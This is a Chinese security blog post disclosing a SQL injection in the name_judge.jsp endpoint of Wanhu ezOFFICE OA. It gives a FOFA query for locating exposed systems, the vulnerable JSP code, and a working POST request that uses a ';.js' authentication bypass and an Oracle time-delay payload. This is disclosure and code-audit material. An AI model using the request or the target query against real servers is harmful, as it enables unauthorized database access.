---
title: "万户OA name_judge.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-name_judge-sqli.html
asset_dir: assets/万户oa-name_judge.jsp-sql注入漏洞
---

# 万户OA name\_judge.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/30 07:39
* 896浏览
* [0评论](#comment)
* 18分钟阅读

深入探索

软件

认证

鉴权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice) 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。万户 ezOFFICE name\_judge.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql注入)漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/漏洞)获取数据库权限，深入利用可获取服务器权限。

SQL注入防护

# 影响版本

> 老旧版本

# fofa语法

> app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞分析

直接看name\_judge.jsp文件里的业务实现逻辑吧，非常简单明了

代码安全审计

```
String govFormName=request.getParameter("govFormName")==null?"":request.getParameter("govFormName").toString();
String formId=request.getParameter("formId")==null?"":request.getParameter("formId").toString();
String formType=request.getParameter("formType")==null?"":request.getParameter("formType").toString();

try{
        conn = dsb.getDataSource().getConnection();
        stmt = conn.createStatement();
        //String strsql="select WF_IMMOFORM_ID  from wf_immobilityform where immoForm_displayName= '"+govFormName+"' ";

        String strsql="select id  from GOV_CUSTOM_DOCUMNET where govFormType="+formType+" and govFormName= '"+govFormName+"' ";

        if(formId!=null&&!formId.equals("")){    
          //strsql+="  and  WF_IMMOFORM_ID<>"+formId;
           strsql+="  and  govFormId<>"+formId;
        }

        java.sql.ResultSet rs = stmt.executeQuery(strsql);

        if(rs.next()){
            out.print("0");

        }else{
            out.print("1");

        }
```

深入探索

网络安全培训

VPN服务

安全运维咨询

三个参数`govFormName`、`formId`和`formType`都是直接拼接进SQL语句中然后用`executeQuery`执行，所有参数都**没有过滤或校验**，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

权限绕过分析参考：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

漏洞预警服务

```
POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
Host: ezoffice.mrxn.net
Content-Type: application/x-www-form-urlencoded

formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',4)--&govFormName=1&formId=1
```

成功延时4秒

[![万户OA name_judge.jsp SQL注入漏洞](images/img-001-0bc0fa43c20b.webp)](https://image.mrxn.net/d143ab9044034eac9268e6c50eff19a1.webp)

其他万户OA 相关[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

营销

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户OA name\_judge.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-name_judge-sqli.html)  
文章链接：<https://mrxn.net/jswz/defaultroot-ezOFFICE-name_judge-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-name\_judge-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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